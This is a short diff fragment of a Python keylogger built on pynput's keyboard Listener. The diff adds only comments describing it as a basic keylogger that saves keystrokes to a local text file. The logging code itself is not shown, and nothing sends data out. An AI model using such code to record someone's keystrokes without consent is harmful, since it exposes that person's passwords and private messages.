@@ -11,3 +11,6 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+#This is basics key logger it will display a txt file on local storage 
+#run divice
